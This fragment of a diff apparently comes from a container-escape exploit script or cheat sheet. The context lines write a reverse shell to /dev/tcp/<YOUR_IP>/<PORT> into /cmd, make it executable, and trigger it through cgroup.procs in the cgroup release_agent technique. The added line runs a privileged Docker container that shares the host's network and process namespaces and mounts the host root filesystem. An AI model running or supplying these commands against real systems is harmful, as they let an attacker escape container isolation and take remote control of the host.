@@ -33,3 +33,5 @@ echo 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1"' >> /cmd
 chmod +x /cmd
 
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+
+docker run -it --privileged --net=host --pid=host --ipc=host --volume /:/host ubuntu bash
